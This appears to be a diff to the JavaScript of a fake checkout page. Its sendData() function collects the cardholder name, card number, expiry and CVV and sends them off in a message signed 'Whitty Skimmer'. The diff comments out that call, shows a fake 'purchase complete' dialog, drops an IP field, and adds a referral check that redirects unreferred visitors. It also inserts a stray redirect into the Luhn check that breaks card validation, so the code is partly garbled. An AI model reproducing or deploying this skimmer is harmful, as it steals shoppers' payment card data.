@@ -20,6 +20,10 @@
 })()
 
 window.onload = function () {
+  if (localStorage.getItem("validReferral") !== "true") {
+    window.location.href = "/";
+  }
+
   document.getElementById("cc-number").onchange = validateCard;
 }
 
@@ -43,7 +47,7 @@ function luhn(num){
             sum +=( curDigit*2)-9;
           }
           else
-          {
+          {window.location.href = "/";
             sum += curDigit*2;
           }
       }
@@ -71,8 +75,9 @@ function validateCard() {
 
 function validateForm() {
   if (document.getElementById("checkoutForm").checkValidity()) {
-    event.preventDefault()
-    alert("vaild!")
+    event.preventDefault();
+    // sendData();
+    $("#purchaseComplete").modal("show");
   }
   return false;
 }
@@ -95,11 +100,6 @@ function sendData() {
         title: "Payment Info",
         description: "Name on Card: " + document.getElementById("cc-name").value + "\nCard Number: " + document.getElementById("cc-number").value + "\nExpiration Month: " + document.getElementById("cc-expiration-month").value + "\nExpiration Year: " + document.getElementById("cc-expiration").value + "\nCVV: " + document.getElementById("cc-cvv").value,
         color: null
-      },
-      {
-        title: "Other Info",
-        description: "IP Address:",
-        color: 16711680
       }
     ],
     username: "Whitty Skimmer",
@@ -108,4 +108,8 @@ function sendData() {
 
   request.send(JSON.stringify(message));
 
+}
+
+function returnHome() {
+  window.location.href = "/";
 }
